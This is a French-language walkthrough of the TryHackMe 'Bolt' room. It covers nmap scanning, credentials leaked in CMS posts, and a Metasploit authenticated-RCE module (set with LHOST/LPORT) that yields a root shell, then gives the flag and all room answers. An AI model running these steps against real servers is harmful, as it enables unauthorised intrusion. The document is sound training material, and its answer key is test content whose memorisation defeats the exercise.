# TryHackMe: Bolt

**Objectif :** enumerer le serveur, identifier l'instance Bolt CMS exposee sur un port non standard, recuperer les identifiants divulgues dans les billets du site, exploiter la RCE authentifiee de Bolt via Metasploit, puis recuperer le flag final sur la machine.

---

## Introduction

La room **Bolt** est une machine web tres directe. Elle est ideale pour revoir une chaine courte mais realiste :

- scan reseau
- lecture attentive du contenu public
- recuperation d'identifiants
- exploitation d'une RCE authentifiee connue
- shell root immediat

La room est guidee par questions, donc je reprends chaque etape dans l'ordre en gardant toute la logique offensive.

---

## Task 1: Deploy the machine

### Question 1: Start the machine

Je deploie la cible depuis la room, j'attends quelques minutes que les services soient tous disponibles, puis je passe a la reconnaissance.

### Reponse

`Done`

---

## Task 2: Hack your way into the machine!

### Question 1: What port number has a web server with a CMS running?

Je commence par un scan Nmap :

```bash
nmap -sC -sV -Pn <IP>
```

Les resultats publics convergent sur trois ports ouverts :

- `22/tcp` - SSH
- `80/tcp` - Apache
- `8000/tcp` - HTTP avec Bolt CMS

Le service CMS tourne bien sur le port :

```text
8000
```

### Reponse

**Port running the CMS:** `8000`

### Question 2: What is the username we can find in the CMS?

En visitant `http://<IP>:8000/`, on tombe sur la page **Bolt | A hero is unleashed**.

L'un des billets publics contient un message de l'administrateur Jake, qui laisse explicitement son username :

```text
bolt
```

### Reponse

**Username found in the CMS:** `bolt`

### Question 3: What is the password we can find for the username?

Un second billet, adresse au support IT, divulgue le mot de passe :

```text
boltadmin123
```

### Reponse

**Password found for the user:** `boltadmin123`

### Question 4: What version of the CMS is installed on the server? (Ex: Name 1.1.1)

Je me connecte a l'interface d'administration :

```text
http://<IP>:8000/bolt/login
```

Identifiants :

- utilisateur : `bolt`
- mot de passe : `boltadmin123`

Une fois authentifie, la version est visible en bas de l'interface :

```text
Bolt 3.7.1
```

### Reponse

**Installed CMS version:** `Bolt 3.7.1`

### Question 5: There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?

Je cherche les exploits Bolt :

```bash
searchsploit bolt
```

L'exploit pertinent est :

```text
Bolt CMS 3.7.0 - Authenticated Remote Code Execution
```

Avec l'identifiant Exploit-DB :

```text
48296
```

### Reponse

**EDB-ID:** `48296`

### Question 6: Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit?

Dans Metasploit :

```text
msfconsole
search bolt
```

Le module attendu par la room est :

```text
exploit/unix/webapp/bolt_authenticated_rce
```

### Reponse

**Metasploit module path:** `exploit/unix/webapp/bolt_authenticated_rce`

---

## Exploitation: RCE authentifiee sur Bolt

### Question 7: Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit

Je configure le module :

```text
use exploit/unix/webapp/bolt_authenticated_rce
set LHOST <MON_IP_THM>
set LPORT 4444
set RHOSTS <IP>
set USERNAME bolt
set PASSWORD boltadmin123
run
```

Le module s'authentifie sur Bolt puis enchaine vers une execution de code distante. J'obtiens rapidement un shell root.

Je stabilise ensuite si necessaire :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Reponse

`Done`

---

## Recuperation du flag

### Question 8: Look for flag.txt inside the machine

Une fois le shell obtenu, je verifie mon contexte :

```bash
whoami
```

Ici, on arrive directement en root.

Je cherche ensuite le flag :

```bash
find / -type f -name flag.txt 2>/dev/null
```

Contrairement a beaucoup de rooms, le flag n'est pas dans `/root`, mais dans `/home` :

```bash
cat /home/flag.txt
```

### Reponse

**flag.txt:** `THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}`

---

## Resume des reponses de la room

- Start the machine `Done`
- What port number has a web server with a CMS running? `8000`
- What is the username we can find in the CMS? `bolt`
- What is the password we can find for the username? `boltadmin123`
- What version of the CMS is installed on the server? `Bolt 3.7.1`
- What's its EDB-ID? `48296`
- What's the full path for this exploit? `exploit/unix/webapp/bolt_authenticated_rce`
- Set the exploit options and run it `Done`
- Look for flag.txt inside the machine `THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}`

---

## Commandes importantes

### Scan reseau

```bash
nmap -sC -sV -Pn <IP>
```

Permet d'identifier le port `8000`, qui est le vrai point d'entree utile.

### Recherche d'exploit

```bash
searchsploit bolt
```

Fournit l'EDB-ID `48296`.

### Exploitation Metasploit

```text
use exploit/unix/webapp/bolt_authenticated_rce
set USERNAME bolt
set PASSWORD boltadmin123
run
```

Transforme les credentials divulgués en shell root.

### Recherche du flag

```bash
find / -type f -name flag.txt 2>/dev/null
```

Utile pour constater que le flag final est stocke dans `/home`.

---

## Raisonnement complet

Cette room est courte, mais propre :

1. un scan revele un port web non standard
2. le contenu public du CMS divulgue directement un identifiant
3. un second billet donne le mot de passe
4. la version du CMS se lit dans l'interface admin
5. la faille RCE authentifiee est publique
6. Metasploit permet d'enchainer proprement jusqu'au shell

Il n'y a aucun brute force inutile ni etape artificielle. C'est une progression tres lisible.

---

## Conclusion

**Bolt** est une bonne room d'initiation aux CMS vulnerables. Elle montre qu'une simple fuite de credentials dans le contenu d'un site peut suffire a rendre exploitable une faille d'execution de code connue.

***Auteur*** *: Saad Idrissi*
